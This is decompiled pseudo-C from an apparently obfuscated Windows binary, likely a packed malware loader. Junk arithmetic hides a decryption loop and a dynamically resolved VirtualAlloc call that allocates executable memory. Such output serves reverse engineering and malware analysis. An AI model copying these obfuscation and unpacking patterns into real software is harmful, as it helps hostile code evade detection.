            uVar18 = 0;
          }
          _DAT_004e883d = _DAT_004e883d + uVar18;
          iVar9 = FUN_004690db(uVar18);
          iVar3 = 0x244d;
          uVar18 = iVar9 + 0x244d;
          if ((in_stack_ffffffac & uVar18) != 0) {
            uVar18 = (iVar9 + 0x2970) * 2;
          }
          _DAT_004e9086 = uVar18 - 1;
          FUN_004692cf(0x9e0c);
          uVar14 = (undefined)in_stack_ffffffac;
          pHVar10 = LoadCursorA((HINSTANCE)0x0,(LPCSTR)0x0);
          if (pHVar10 == (HCURSOR)0x0) {
            _DAT_004e88c9 = _DAT_004e88c9 + -0x4806;
            FUN_0046976c();
            uVar15 = 9;
            ExcludeClipRect((HDC)0x9,0xee,0xf2,0xd5,0xad);
            FUN_004692cf(0);
            _DAT_004e8635 = FUN_004698e5(0x4e8cea);
            uVar16 = (undefined)iVar6;
            if ((char)_DAT_004e8635 != '\0') {
              _DAT_004e8635 = 0xbe;
            }
            _DAT_004e8866 = _DAT_004e8635 >> 1 | (uint)((_DAT_004e8635 & 1) != 0) << 0x1f;
            uVar18 = (_DAT_004e8635 >> 1) << 4;
            uVar11 = uVar18 | 0xa4f;
            if (uVar11 != 0) {
              uVar11 = uVar11 << 2 | uVar18 >> 0x1e;
            }
            _DAT_004e9243 = _DAT_004e9243 + uVar11;
            _DAT_004e8ec0 = 0x3e8b93;
            uVar17 = 0xfb;
            RegSaveKeyA((HKEY)0xf29cdfb,&DAT_004e87f1,(LPSECURITY_ATTRIBUTES)&DAT_004e8aa3);
            uVar18 = _DAT_004e80f5 | 0x4c9a0;
            if (uVar18 != 0) {
              uVar18 = 0xbdbd3;
            }
            _DAT_004e8fdc = _DAT_004e8fdc + (uVar18 - 0x1f0);
            bVar1 = FUN_00469846(uVar18 - 0x1f1,0,0x4e8fea);
            _DAT_004e894d = CONCAT31(extraout_var,bVar1) + _DAT_004e8f3a;
            _DAT_004e8f81 = _DAT_004e894d + 0xdef;
            _DAT_004e82ed = _DAT_004e82ed - _DAT_004e8f81;
            _DAT_004e8643 = FUN_004693ab(0);
            _DAT_004e82d3 = 0x55760;
            _DAT_004e857d = 0x350f6;
            _DAT_004e9202 = _DAT_004e9202 + -0x55760;
            FUN_00469e21((char)DAT_004e8449,uVar12,uVar13,in_stack_ffffffa8,uVar14,in_stack_ffffffb0
                         ,in_stack_ffffffb4,uVar15,uVar16,uVar17,in_stack_00000021);
            _DAT_004e8261 = FUN_00469287(0x33,0xd60d);
            bVar1 = FUN_00469846(&DAT_004e832a,0xa83,DAT_004e8252);
            _DAT_004e8489 = CONCAT31(extraout_var_00,bVar1);
            _DAT_004e834d = 0x3082;
            _DAT_004e864d = _DAT_004e864d + 0x3082;
            FUN_00469c1a(this_01,0x4e91f1);
            iVar3 = 0xfff;
            if ((uStack_18 | 0xfff) == 0) {
              iVar3 = 0xf;
            }
            _DAT_004e8343 = 0x3ffe;
            iVar3 = CONCAT13(uRam004e89fa,_DAT_004e89f7) - iVar3;
            _DAT_004e89f7 = (undefined3)iVar3;
            uRam004e89fa = (undefined)((uint)iVar3 >> 0x18);
            return;
          }
        }
        uVar18 = iVar3 + (int)&stack0xfffffffc * 2 + 0x52f;
        if ((uVar18 & 0x1c67) != 0) {
          uVar18 = 0x76f20;
        }
        _DAT_004e8669 = _DAT_004e8669 - uVar18;
        FUN_00469000();
      }
    }
  }
LAB_00469037:
  iVar3 = 0xf8c;
  if ((_DAT_004e8951 & 0xf8c) == 0) {
    iVar3 = 0x4eb51 - _DAT_004e9040;
  }
  _DAT_004e8d36 = _DAT_004e8d36 + iVar3;
  return;
}



// WARNING: Removing unreachable block (ram,0x0046a1fe)
// WARNING: Removing unreachable block (ram,0x0046a286)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00469e21(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
                 undefined param_5,undefined param_6,undefined param_7,undefined param_8,
                 undefined param_9,undefined param_10,undefined1 param_11)

{
  char *pcVar1;
  byte bVar2;
  char cVar3;
  byte bVar4;
  int in_EAX;
  uint uVar5;
  int iVar6;
  uint uVar7;
  char *unaff_EBX;
  char *pcVar8;
  undefined auStack_32c [756];
  uint local_2c;
  uint local_10;
  
  uVar5 = in_EAX - 1;
  if ((local_10 & uVar5) == 0) {
    uVar5 = in_EAX + 0x1022;
  }
  uVar7 = (uVar5 & 0xff) >> 1;
  if (uVar7 != 0x6e8) {
    uVar7 = (uVar5 & 0xfe) - 1;
  }
  _DAT_004e82cc = _DAT_004e82cc - uVar7;
  iVar6 = 0x5e52;
  if ((local_2c & 0x5e52) == 0) {
    iVar6 = 0x17ce8;
  }
  s_BB__BB__004e84fb._0_4_ = s_BB__BB__004e84fb._0_4_ - iVar6;
  _DAT_004e8fbb = 0x5514;
  _DAT_004e8d2d = _DAT_004e8a40 + 0x2a000007;
  _DAT_004e8251 = 0x72a;
  _DAT_004e8f76 = (uint)auStack_32c | 0x8c5;
  if (((uint)auStack_32c | 0x8c5) == 0) {
    _DAT_004e8f76 = _DAT_004e8bf6;
  }
  bVar4 = 0x72;
  pcVar8 = &DAT_004e9305;
  _DAT_004e920f = _DAT_004e8f76;
  do {
    uVar5 = _DAT_004e87ee | 0x12d;
    if (uVar5 != 0) {
      uVar5 = 0x34f7f;
    }
    uVar5 = uVar5 + 0xb9b;
    if ((uVar5 & 0x127f) != 0) {
      uVar5 = (uVar5 - _DAT_004e8395) - 0xf12;
    }
    _DAT_004e8587 = _DAT_004e8587 + uVar5;
    pcVar1 = pcVar8 + 1;
    bVar2 = *pcVar8 + bVar4 + 1 ^ 0xff;
    bVar2 = (((bVar2 >> 2 | bVar2 << 6) + 0x3a ^ 0xdb) + bVar4) - 0x12;
    cVar3 = ((bVar2 * '\b' | bVar2 >> 5) ^ 0x1b) + bVar4;
    bVar4 = bVar4 >> 2 | bVar4 << 6;
    *unaff_EBX = cVar3 + -0x4b;
    _DAT_004e9077 = 0x21c60;
    pcVar8 = pcVar1;
    unaff_EBX = unaff_EBX + 1;
  } while (pcVar1 != &DAT_004e9d0a);
  _DAT_004e9114 = 0xffffffff;
  if (_DAT_004e8e06 == 0) {
    _DAT_004e9114 = 0x54a;
  }
  _DAT_004e8841 = _DAT_004e8ad1 | 0x50d64;
  if (_DAT_004e8841 == 0) {
    _DAT_004e8841 = 0;
  }
  _DAT_004e8841 = _DAT_004e8841 - DAT_004e8efd;
  if ((_DAT_004e8841 & 0x45) != 0) {
    _DAT_004e8841 = (_DAT_004e8841 * 0x40 + -0x50e) - _DAT_004e855c;
  }
  _DAT_004e8809 = _DAT_004e8809 + -3000;
  uVar5 = 1 - _DAT_004e83aa;
  _DAT_004e8698 = uVar5;
  _DAT_004e807f = 0;
  iVar6 = CONCAT22(uRam004e8024,_DAT_004e8022) + uVar5;
  _DAT_004e8022 = (undefined2)iVar6;
  uRam004e8024 = (undefined2)((uint)iVar6 >> 0x10);
  if ((uVar5 & 0x11ab) != 0) {
    uVar5 = uVar5 | 0x6bc;
  }
  _DAT_004e8415 =
       (uVar5 << 2 | uVar5 >> 0x1e) + CONCAT22(_DAT_004e8022,_DAT_004e8020) | _DAT_004e8708;
  if (_DAT_004e8415 == 0) {
    _DAT_004e8415 = _DAT_004e89dc + 0xe9fc;
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x0046a5f7)
// WARNING: Removing unreachable block (ram,0x0046a6a7)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0046a36a(void)

{
  int iVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  undefined4 uStack_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined4 local_58;
  int local_50;
  uint local_4c;
  int local_48;
  int local_3c;
  undefined4 local_38;
  uint local_2c;
  uint local_28;
  uint local_20;
  uint local_18;
  int local_14;
  uint local_10;
  
  uStack_5c = 0;
  local_14 = 0x3a0b2;
  if ((local_4c & 0x3a0b2) != 0) {
    local_14 = 0x39407;
  }
  uStack_60 = 0x32334c65;
  _DAT_004e8e02 = _DAT_004e8e02 + 0x1e02;
  _DAT_004e8573 = _DAT_004e8531 + 0x725;
  if ((local_20 & _DAT_004e8573) != 0) {
    _DAT_004e8573 = _DAT_004e8531 - 0x14bc;
  }
  _DAT_004e86d8 = _DAT_004e86d8 + (0x1fee6 - ram0x004e844c);
  uStack_64 = 0x4e72654b;
  iVar1 = 0x6f2 - _DAT_004e9195;
  if (iVar1 == 0x1f2) {
    iVar1 = 0x2fd00;
  }
  _DAT_004e8a49 = _DAT_004e8a49 + iVar1;
  local_10 = 0x7abb;
  _DAT_004e8b5f = 0xad;
  hModule = LoadLibraryA((LPCSTR)&uStack_64);
  local_50 = 0x7b72 - _DAT_004e8f4b;
  if (local_50 == 0x367) {
    local_50 = 0x1b38;
  }
  uStack_5c = 0x7845;
  _DAT_004e83b7 = 0;
  _DAT_004e8af6 = 0;
  uVar4 = _DAT_004e9109 + 0x209U | 0x5ad;
  if (uVar4 != 0) {
    uVar4 = uVar4 - 1;
  }
  uVar4 = uVar4 | 0x170;
  if ((local_28 & uVar4) != 0) {
    uVar4 = 0x7855f;
  }
  _DAT_004e8602 = _DAT_004e8602 + (uVar4 - CONCAT22(_DAT_004e807c,_DAT_004e807a));
  uStack_60 = 0x636f6c6c;
  local_14 = _DAT_004e906d + 0x62f02;
  uStack_64 = 0x416c6175;
  _DAT_004e81f1 = 1;
  local_58 = 1;
  _DAT_004e8470 = 0x1491;
  ram0x004e82e9 = 0x29;
  uVar4 = 0x65bc6;
  if ((_DAT_004e87e4 & 0x65bc6) != 0) {
    uVar4 = 0x65bc5;
  }
  uVar4 = uVar4 >> 2 | uVar4 << 0x1e;
  local_18 = uVar4 + 0xe1b;
  if (local_18 != 0) {
    local_18 = uVar4 + 0x21b1;
  }
  puVar5 = (undefined *)((int)&hModule[0x71].unused + 2);
  if ((local_18 & (uint)puVar5) != 0) {
    puVar5 = (undefined *)0x178f8;
  }
  local_3c = (int)puVar5 + 0x17bd;
  if ((int)puVar5 + 0x17bd == 0) {
    local_3c = _DAT_004e8a2b;
  }
  _DAT_004e89c4 = _DAT_004e89c4 - (local_3c + 0xbe);
  local_38 = 0x7d5;
  local_28 = 0xffffffff;
  pFVar2 = GetProcAddress(hModule,&stack0xffffff98);
  _DAT_004e8996 = 0x867c;
  if ((_DAT_004e8957 & 0x867c) != 0) {
    _DAT_004e8996 = 0x4932;
  }
  _DAT_004e8996 = _DAT_004e8996 & 0xf;
  iVar1 = DAT_004e8aeb + 0xdd0;
  if (iVar1 == 0x2d6) {
    iVar1 = 0x5ac;
  }
  uStack_5c = 0x40;
  iVar3 = 0x8b8;
  if ((_DAT_004e8060 & 0x8b8) == 0) {
    iVar3 = 0x8b8 - _DAT_004e8fc7;
  }
  _DAT_004e8d3c = _DAT_004e8d3c - iVar3;
  s__bb____004e8a24[0] = '\0';
  s__bb____004e8a24[1] = '0';
  s__bb____004e8a24[2] = '\0';
  s__bb____004e8a24[3] = '\0';
  uStack_60 = 0x3000;
  local_14 = 0x426;
  uVar4 = 0x269U - _DAT_004e87b3 | 0x5b1;
  if (uVar4 == 0) {
    uVar4 = CONCAT22(uRam004e807e,_DAT_004e807c) + 0x614;
  }
  uVar4 = uVar4 + 0x129e;
  if ((local_2c & uVar4) != 0) {
    uVar4 = uVar4 - _DAT_004e8768;
  }
  DAT_004e91bc = (undefined)((uint)iVar1 >> 0x18);
  iVar3 = CONCAT31((undefined3)uRam004e91bd,DAT_004e91bc) + uVar4;
  DAT_004e91bc = (undefined)iVar3;
  uRam004e91bd._0_3_ = (undefined3)((uint)iVar3 >> 8);
  uStack_64 = 0x509a6;
  uVar4 = _DAT_004e8768 | 0x10f;
  if (uVar4 == 0) {
    uVar4 = -_DAT_004e849d;
  }
  _DAT_004e9154 = _DAT_004e9154 - (uVar4 + 0x14be);
  _DAT_004e9179 = 0xffffffff;
  if (_DAT_004e8b2e != 0) {
    _DAT_004e9179 = 0x6fa;
  }
  uVar4 = _DAT_004e9179 | 0xe0c;
  if ((_DAT_004e8826 & uVar4) != 0) {
    uVar4 = uVar4 << 7 | _DAT_004e9179 >> 0x19;
  }
  _DAT_004e8937 = _DAT_004e8937 + uVar4;
  local_10 = (uint)(pFVar2 + 1) | _DAT_004e8c97;
  if (local_10 == 0) {
    local_10 = _DAT_004e8b90 >> 3;
  }
  local_10 = local_10 - _DAT_004e8950;
  if ((local_10 & 0xe5) != 0) {
    local_10 = local_10 + 1;
  }
  _DAT_004e8afc = 0;
  if (local_48 != 0) {
    _DAT_004e8afc = 0x282d0;
  }
  _DAT_004e8afc = _DAT_004e8afc + -0x232c;
  if (_DAT_004e8afc == 0) {
    _DAT_004e8afc = -_DAT_004e8089;
  }
  _DAT_004e8a5b = _DAT_004e8996;
  (*pFVar2)(0xffffffff);
  _DAT_004e9101 = 0xfffff3a9;
  _DAT_004e8ebc = _DAT_004e8ebc + 0xc57;
  return;
}


